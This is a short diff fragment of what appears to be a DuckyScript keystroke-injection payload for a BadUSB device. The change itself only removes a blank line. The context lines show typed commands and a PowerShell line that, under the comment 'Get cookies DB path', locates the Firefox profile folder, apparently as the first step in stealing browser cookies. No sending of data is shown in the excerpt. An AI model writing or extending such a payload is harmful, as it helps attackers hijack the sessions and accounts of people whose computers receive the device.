@@ -12,7 +12,6 @@ DELAY 500
 ENTER
 DELAY 2000
 
-
 REM Get cookies DB path
 STRINGLN
     $firefoxProfilePath = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles'
